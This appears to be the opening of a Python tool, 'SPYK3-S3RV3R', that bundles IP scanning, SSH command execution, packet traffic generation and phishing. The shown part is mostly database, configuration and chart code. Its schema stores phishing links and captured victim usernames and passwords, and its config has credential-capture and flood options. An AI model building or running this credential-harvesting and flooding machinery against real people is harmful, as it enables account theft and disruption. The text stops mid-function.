#!/usr/bin/env python3
"""
🕷️ SPYK3-S3RV3R v0.0.2
Author: Ian Carter Kulani
Description:SPYK3-S3RV3R Ultimate cybersecurity platform combining IP analysis, SSH remote execution,
             multi-platform integration, traffic generation, and social engineering
             with graphical reporting and statistics
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import sqlite3
import ipaddress
import re
import datetime
import shutil
import uuid
import random
import base64
import urllib.parse
import hashlib
import struct
import asyncio
import argparse
import signal
import psutil
import getpass
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from collections import Counter

# =====================
# ENCODING SETUP
# =====================
if platform.system().lower() == 'windows':
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except:
        pass

# =====================
# PLATFORM IMPORTS
# =====================

# Discord
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# SSH
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Scapy for traffic generation
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP
    from scapy.all import send, sr1, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# =====================
# DATA VISUALIZATION
# =====================
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import matplotlib.patches as mpatches
import seaborn as sns
import numpy as np

# PDF Generation
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter, A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib.enums import TA_CENTER, TA_LEFT

# =====================
# COLOR THEMES
# =====================
class Colors:
    # Primary theme colors
    PRIMARY = '\033[94m' if os.name != 'nt' else ''      # Blue
    SECONDARY = '\033[96m' if os.name != 'nt' else ''    # Cyan
    SUCCESS = '\033[92m' if os.name != 'nt' else ''      # Green
    WARNING = '\033[93m' if os.name != 'nt' else ''      # Yellow
    ERROR = '\033[91m' if os.name != 'nt' else ''        # Red
    MAGENTA = '\033[95m' if os.name != 'nt' else ''      # Magenta
    RESET = '\033[0m' if os.name != 'nt' else ''

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".spyk3"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "spyk3.db")
LOG_FILE = os.path.join(CONFIG_DIR, "spyk3.log")
REPORT_DIR = "spyk3_reports"
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
BLOCKED_IPS_DIR = os.path.join(REPORT_DIR, "blocked")
TEMP_DIR = "spyk3_temp"

# Create directories
directories = [
    CONFIG_DIR, REPORT_DIR, GRAPHICS_DIR, SSH_KEYS_DIR, PAYLOADS_DIR,
    PHISHING_DIR, TRAFFIC_LOGS_DIR, SCAN_RESULTS_DIR, BLOCKED_IPS_DIR, TEMP_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SPYK3 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("Spyk3")

# =====================
# DATA CLASSES
# =====================

@dataclass
class IPAnalysisResult:
    """Complete IP analysis result"""
    target_ip: str
    timestamp: str
    ping_result: Dict[str, Any]
    traceroute_result: Dict[str, Any]
    port_scan_result: Dict[str, Any]
    geolocation_result: Dict[str, Any]
    traffic_monitor_result: Dict[str, Any]
    security_status: Dict[str, Any]
    recommendations: List[str]
    success: bool = True
    error: Optional[str] = None
    graphics_files: Dict[str, str] = None

@dataclass
class SSHServer:
    """SSH server configuration"""
    id: str
    name: str
    host: str
    port: int
    username: str
    password: Optional[str] = None
    key_file: Optional[str] = None
    use_key: bool = False
    timeout: int = 30
    created_at: str = None
    last_used: Optional[str] = None
    status: str = "disconnected"
    notes: str = ""

@dataclass
class TrafficGenerator:
    """Traffic generation session"""
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"
    error: Optional[str] = None

@dataclass
class PhishingLink:
    """Phishing link data"""
    id: str
    platform: str
    original_url: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0
    captured_credentials: List[Dict] = None

@dataclass
class ThreatAlert:
    """Security threat alert"""
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class Config:
    """Main configuration"""
    discord_enabled: bool = False
    discord_token: str = ""
    discord_channel_id: str = ""
    discord_admin_role: str = "Admin"
    
    telegram_enabled: bool = False
    telegram_bot_token: str = ""
    telegram_channel_id: str = ""
    
    slack_enabled: bool = False
    slack_bot_token: str = ""
    slack_channel_id: str = ""
    
    auto_block_threshold: int = 5
    scan_timeout: int = 30
    max_traceroute_hops: int = 30
    monitoring_duration: int = 60
    report_format: str = "pdf"
    generate_graphics: bool = True
    
    traffic_max_duration: int = 300
    traffic_max_rate: int = 1000
    traffic_allow_floods: bool = False
    
    ssh_enabled: bool = True
    ssh_default_timeout: int = 30
    ssh_max_connections: int = 5
    
    phishing_default_port: int = 8080
    phishing_capture_creds: bool = True

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS ip_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target_ip TEXT NOT NULL,
                analysis_result TEXT NOT NULL,
                report_path TEXT,
                graphics_path TEXT,
                source TEXT DEFAULT 'local'
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS blocked_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT UNIQUE NOT NULL,
                reason TEXT NOT NULL,
                blocked_by TEXT NOT NULL,
                is_active BOOLEAN DEFAULT 1,
                analysis_result TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ssh_servers (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password TEXT,
                key_file TEXT,
                use_key BOOLEAN DEFAULT 0,
                timeout INTEGER DEFAULT 30,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME,
                status TEXT DEFAULT 'disconnected',
                notes TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                server_id TEXT NOT NULL,
                server_name TEXT,
                command TEXT NOT NULL,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                error TEXT,
                execution_time REAL,
                executed_by TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_id TEXT,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT,
                error TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                original_url TEXT,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS time_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user TEXT,
                result TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS system_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """
        ]
        
        for table_sql in tables:
            self.cursor.execute(table_sql)
        
        self.conn.commit()
    
    def save_analysis(self, target_ip: str, analysis_result: Dict, report_path: str = None, graphics_path: str = None, source: str = "local") -> bool:
        """Save IP analysis to database"""
        try:
            self.cursor.execute('''
                INSERT INTO ip_analysis (target_ip, analysis_result, report_path, graphics_path, source)
                VALUES (?, ?, ?, ?, ?)
            ''', (target_ip, json.dumps(analysis_result), report_path, graphics_path, source))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save analysis: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, blocked_by: str = "system", analysis: Dict = None) -> bool:
        """Block an IP address"""
        try:
            analysis_json = json.dumps(analysis) if analysis else None
            self.cursor.execute('''
                INSERT OR REPLACE INTO blocked_ips (ip_address, reason, blocked_by, analysis_result)
                VALUES (?, ?, ?, ?)
            ''', (ip, reason, blocked_by, analysis_json))
            self.conn.commit()
            logger.info(f"IP {ip} blocked by {blocked_by}: {reason}")
            return True
        except Exception as e:
            logger.error(f"Failed to block IP {ip}: {e}")
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        """Unblock an IP address"""
        try:
            self.cursor.execute('''
                UPDATE blocked_ips SET is_active = 0 WHERE ip_address = ? AND is_active = 1
            ''', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to unblock IP {ip}: {e}")
            return False
    
    def get_blocked_ips(self, active_only: bool = True) -> List[Dict]:
        """Get blocked IPs"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM blocked_ips WHERE is_active = 1 ORDER BY timestamp DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM blocked_ips ORDER BY timestamp DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get blocked IPs: {e}")
            return []
    
    def is_ip_blocked(self, ip: str) -> bool:
        """Check if IP is blocked"""
        try:
            self.cursor.execute('''
                SELECT 1 FROM blocked_ips WHERE ip_address = ? AND is_active = 1
            ''', (ip,))
            return self.cursor.fetchone() is not None
        except Exception as e:
            logger.error(f"Failed to check blocked IP {ip}: {e}")
            return False
    
    def add_ssh_server(self, server: SSHServer) -> bool:
        """Add SSH server to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_servers 
                (id, name, host, port, username, password, key_file, use_key, timeout, notes, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server.id, server.name, server.host, server.port, server.username,
                  server.password, server.key_file, server.use_key, server.timeout,
                  server.notes, server.created_at or datetime.datetime.now().isoformat()))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return False
    
    def get_ssh_servers(self) -> List[Dict]:
        """Get all SSH servers"""
        try:
            self.cursor.execute('SELECT * FROM ssh_servers ORDER BY name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH servers: {e}")
            return []
    
    def get_ssh_server(self, server_id: str) -> Optional[Dict]:
        """Get SSH server by ID"""
        try:
            self.cursor.execute('SELECT * FROM ssh_servers WHERE id = ?', (server_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get SSH server: {e}")
            return None
    
    def delete_ssh_server(self, server_id: str) -> bool:
        """Delete SSH server"""
        try:
            self.cursor.execute('DELETE FROM ssh_servers WHERE id = ?', (server_id,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to delete SSH server: {e}")
            return False
    
    def update_ssh_server_status(self, server_id: str, status: str):
        """Update SSH server status"""
        try:
            self.cursor.execute('''
                UPDATE ssh_servers 
                SET status = ?, last_used = CURRENT_TIMESTAMP
                WHERE id = ?
            ''', (status, server_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH server status: {e}")
    
    def log_ssh_command(self, server_id: str, server_name: str, command: str,
                       success: bool, output: str, error: str = None,
                       execution_time: float = 0.0, executed_by: str = "system"):
        """Log SSH command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO ssh_commands 
                (server_id, server_name, command, success, output, error, execution_time, executed_by)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server_id, server_name, command, success, output[:5000], 
                  error[:500] if error else None, execution_time, executed_by))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, traffic: TrafficGenerator, executed_by: str = "system"):
        """Log traffic generation"""
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs 
                (traffic_id, traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (traffic.id, traffic.traffic_type, traffic.target_ip, traffic.target_port,
                  traffic.duration, traffic.packets_sent, traffic.bytes_sent,
                  traffic.status, executed_by, traffic.error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save phishing link to database"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, original_url, phishing_url, template, created_at, clicks)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (link.id, link.platform, link.original_url, link.phishing_url, link.template,
                  link.created_at, link.clicks))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str, additional_data: str = ""):
        """Save captured credentials"""
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip_address, user_agent, additional_data))
            self.conn.commit()
            logger.info(f"Credentials captured for link {link_id} from {ip_address}")
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
    
    def log_threat(self, alert: ThreatAlert):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip,
                  alert.severity, alert.description, alert.action_taken))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_time_command(self, command: str, user: str = "system", result: str = ""):
        """Log time/date command"""
        try:
            self.cursor.execute('''
                INSERT INTO time_history (command, user, result, timestamp)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (command, user, result[:500]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log time command: {e}")
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_traffic_logs(self, limit: int = 20) -> List[Dict]:
        """Get recent traffic generation logs"""
        try:
            self.cursor.execute('''
                SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    def get_ssh_command_history(self, server_id: str = None, limit: int = 50) -> List[Dict]:
        """Get SSH command history"""
        try:
            if server_id:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands 
                    WHERE server_id = ? 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (server_id, limit))
            else:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH command history: {e}")
            return []
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM command_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_time_history(self, limit: int = 20) -> List[Dict]:
        """Get time/date command history"""
        try:
            self.cursor.execute('''
                SELECT command, user, result, timestamp FROM time_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get time history: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM time_history')
            stats['total_time_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_servers')
            stats['total_ssh_servers'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_commands')
            stats['total_ssh_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM blocked_ips WHERE is_active = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links WHERE active = 1')
            stats['active_phishing_links'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def log_connection(self, local_ip: str, local_port: int, remote_ip: str, remote_port: int,
                      protocol: str, status: str):
        """Log network connection"""
        pass
    
    def close(self):
        """Close database connection"""
        try:
            self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    """Manage configuration settings"""
    
    @staticmethod
    def load_config() -> Config:
        """Load configuration from file"""
        config = Config()
        
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    data = json.load(f)
                    
                    # Discord
                    config.discord_enabled = data.get('discord', {}).get('enabled', False)
                    config.discord_token = data.get('discord', {}).get('token', '')
                    config.discord_channel_id = data.get('discord', {}).get('channel_id', '')
                    config.discord_admin_role = data.get('discord', {}).get('admin_role', 'Admin')
                    
                    # Telegram
                    config.telegram_enabled = data.get('telegram', {}).get('enabled', False)
                    config.telegram_bot_token = data.get('telegram', {}).get('bot_token', '')
                    config.telegram_channel_id = data.get('telegram', {}).get('channel_id', '')
                    
                    # Slack
                    config.slack_enabled = data.get('slack', {}).get('enabled', False)
                    config.slack_bot_token = data.get('slack', {}).get('bot_token', '')
                    config.slack_channel_id = data.get('slack', {}).get('channel_id', '')
                    
                    # Security
                    config.auto_block_threshold = data.get('auto_block_threshold', 5)
                    config.scan_timeout = data.get('scan_timeout', 30)
                    config.max_traceroute_hops = data.get('max_traceroute_hops', 30)
                    config.monitoring_duration = data.get('monitoring_duration', 60)
                    config.report_format = data.get('report_format', 'pdf')
                    config.generate_graphics = data.get('generate_graphics', True)
                    
                    # Traffic
                    config.traffic_max_duration = data.get('traffic', {}).get('max_duration', 300)
                    config.traffic_max_rate = data.get('traffic', {}).get('max_rate', 1000)
                    config.traffic_allow_floods = data.get('traffic', {}).get('allow_floods', False)
                    
                    # SSH
                    config.ssh_enabled = data.get('ssh', {}).get('enabled', True)
                    config.ssh_default_timeout = data.get('ssh', {}).get('default_timeout', 30)
                    config.ssh_max_connections = data.get('ssh', {}).get('max_connections', 5)
                    
                    # Phishing
                    config.phishing_default_port = data.get('phishing', {}).get('default_port', 8080)
                    config.phishing_capture_creds = data.get('phishing', {}).get('capture_creds', True)
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return config
    
    @staticmethod
    def save_config(config: Config) -> bool:
        """Save configuration to file"""
        try:
            data = {
                "discord": {
                    "enabled": config.discord_enabled,
                    "token": config.discord_token,
                    "channel_id": config.discord_channel_id,
                    "admin_role": config.discord_admin_role
                },
                "telegram": {
                    "enabled": config.telegram_enabled,
                    "bot_token": config.telegram_bot_token,
                    "channel_id": config.telegram_channel_id
                },
                "slack": {
                    "enabled": config.slack_enabled,
                    "bot_token": config.slack_bot_token,
                    "channel_id": config.slack_channel_id
                },
                "auto_block_threshold": config.auto_block_threshold,
                "scan_timeout": config.scan_timeout,
                "max_traceroute_hops": config.max_traceroute_hops,
                "monitoring_duration": config.monitoring_duration,
                "report_format": config.report_format,
                "generate_graphics": config.generate_graphics,
                "traffic": {
                    "max_duration": config.traffic_max_duration,
                    "max_rate": config.traffic_max_rate,
                    "allow_floods": config.traffic_allow_floods
                },
                "ssh": {
                    "enabled": config.ssh_enabled,
                    "default_timeout": config.ssh_default_timeout,
                    "max_connections": config.ssh_max_connections
                },
                "phishing": {
                    "default_port": config.phishing_default_port,
                    "capture_creds": config.phishing_capture_creds
                }
            }
            
            with open(CONFIG_FILE, 'w') as f:
                json.dump(data, f, indent=4)
            
            logger.info("Configuration saved successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False

# =====================
# GRAPHICS GENERATOR
# =====================
class GraphicsGenerator:
    """Generate statistical graphics for IP analysis"""
    
    def __init__(self, output_dir: str = GRAPHICS_DIR):
        self.output_dir = output_dir
        Path(output_dir).mkdir(exist_ok=True)
        plt.style.use('seaborn-v0_8-darkgrid')
        sns.set_palette("husl")
    
    def generate_port_statistics(self, port_data: List[Dict], target_ip: str, timestamp: str) -> Dict[str, str]:
        """Generate port statistics graphics"""
        graphics_files = {}
        
        open_ports = []
        common_services = []
        
        for port_info in port_data:
            port = port_info.get('port', 0)
            state = port_info.get('state', 'unknown')
            service = port_info.get('service', 'unknown')
            
            if state == 'open':
                open_ports.append(int(port))
                if service != 'unknown':
                    common_services.append(service)
        
        fig, axes = plt.subplots(2, 2, figsize=(16, 12))
        fig.suptitle(f'Port Analysis Statistics - {target_ip}\n{timestamp}', fontsize=16, fontweight='bold')
        
        # Open Ports
        ax1 = axes[0, 0]
        if open_ports:
            open_ports.sort()
            port_labels = [str(p) for p in open_ports[:15]]
            port_values = [1] * len(port_labels)
            
            bars = ax1.bar(range(len(port_labels)), port_values, color='#ff6b6b')
            ax1.set_xticks(range(len(port_labels)))
            ax1.set_xticklabels(port_labels, rotation=45, ha='right')
            ax1.set_title(f'Open Ports (First {len(port_labels)})', fontsize=14, fontweight='bold')
            ax1.set_ylabel('Count')
            ax1.set_xlabel('Port Number')
        else:
            ax1.text(0.5, 0.5, 'No Open Ports Detected', ha='center', va='center', fontsize=12)
            ax1.set_title('Open Ports', fontsize=14, fontweight='bold')
        
        # Common Services
        ax2 = axes[0, 1]
        if common_services:
            service_counts = Counter(common_services)
            services = list(service_counts.keys())[:10]
            counts = list(service_counts.values())[:10]
            
            bars = ax2.barh(range(len(services)), counts, color='#45b7d1')
            ax2.set_yticks(range(len(services)))
            ax2.set_yticklabels(services)
            ax2.set_title('Common Services Detected', fontsize=14, fontweight='bold')
            ax2.set_xlabel('Frequency')
        else:
            ax2.text(0.5, 0.5, 'No Common Services Detected', ha='center', va='center', fontsize=12)
            ax2.set_title('Common Services', fontsize=14, fontweight='bold')
        
        # Port Range Distribution
        ax3 = axes[1, 0]
        if open_ports:
            port_ranges = {
                'Well-known (0-1023)': len([p for p in open_ports if p <= 1023]),
                'Registered (1024-49151)': len([p for p in open_ports if 1024 <= p <= 49151]),
                'Dynamic (49152-65535)': len([p for p in open_ports if p >= 49152])
            }
            
            ranges = list(port_ranges.keys())
            values = list(port_ranges.values())
            colors = ['#ff9999', '#66b3ff', '#99ff99']
            
            wedges, texts, autotexts = ax3.pie(
                values,
                labels=ranges,
                autopct='%1.1f%%',
                colors=colors,
                startangle=90,
                explode=(0.05, 0.05, 0.05)
            )
            ax3.set_title('Port Range Distribution', fontsize=14, fontweight='bold')
        else:
            ax3.text(0.5, 0.5, 'No Port Data Available', ha='center', va='center', fontsize=12)
            ax3.set_title('Port Range Distribution', fontsize=14, fontweight='bold')
        
        # Summary
        ax4 = axes[1, 1]
        ax4.text(0.5, 0.5, f'Total Open Ports: {len(open_ports)}', 
                ha='center', va='center', fontsize=14, fontweight='bold')
        ax4.set_title('Summary', fontsize=14, fontweight='bold')
        ax4.axis('off')
        
        plt.tight_layout()
        
        safe_timestamp = timestamp.replace(':', '-').replace(' ', '_')
        port_graphic = os.path.join(self.output_dir, f'port_stats_{target_ip}_{safe_timestamp}.png')
        plt.savefig(port_graphic, dpi=300, bbox_inches='tight')
        graphics_files['port_statistics'] = port_graphic
        plt.close()
        
        return graphics_files
    
    def generate_traffic_statistics(self, traffic_data: Dict, target_ip: str, timestamp: str) -> Dict[str, str]:
        """Generate traffic monitoring statistics graphics"""
        graphics_files = {}
        
        fig, axes = plt.subplots(2, 2, figsize=(16, 12))
        fig.suptitle(f'Traffic Analysis Statistics - {target_ip}\n{timestamp}', fontsize=16, fontweight='bold')
        
        # Threat Level
        ax1 = axes[0, 0]
        threat_level = traffic_data.get('threat_level', 'low')
        connection_count = traffic_data.get('connection_count', 0)
        
        levels = {'low': 0.3, 'medium': 0.6, 'high': 0.9}
        level_value = levels.get(threat_level, 0.3)
        
        colors = ['#ff6b6b' if threat_level == 'high' else '#ffd93d' if threat_level == 'medium' else '#6bcf7f']
        ax1.bar(['Threat Level'], [level_value * 100], color=colors)
        ax1.set_ylim(0, 100)
        ax1.set_ylabel('Level %')
        ax1.set_title(f'Traffic Threat Level: {threat_level.upper()}\n({connection_count} connections)', 
                     fontsize=14, fontweight='bold')
        
        # Connection Protocols
